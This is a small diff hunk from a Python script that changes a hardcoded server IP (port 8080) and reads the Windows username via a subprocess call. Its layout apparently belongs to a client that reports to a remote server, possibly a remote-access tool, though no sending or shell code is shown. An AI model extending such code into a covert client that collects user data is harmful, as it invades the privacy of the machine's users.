@@ -6,7 +6,7 @@ import sys
 
 # Set up the server address and port
 #server_address = '156.196.54.233'  # Replace with your server's IP address
-server_address = '192.168.1.105'
+server_address = '192.168.1.107'
 server_port = 8080                # Replace with your server's port
 
 username = subprocess.getoutput("""echo %username%""")
